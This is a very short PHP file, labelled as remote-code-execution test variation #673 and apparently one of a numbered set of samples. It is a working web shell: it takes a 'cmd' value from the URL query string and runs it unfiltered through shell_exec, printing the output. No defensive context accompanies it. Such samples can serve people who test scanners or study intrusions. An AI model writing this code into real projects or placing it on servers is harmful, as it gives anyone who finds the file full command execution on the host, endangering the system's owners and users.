<?php
// RCE test variation #673
$cmd = $_GET['cmd'] ?? 'ls';
echo shell_exec($cmd);
?>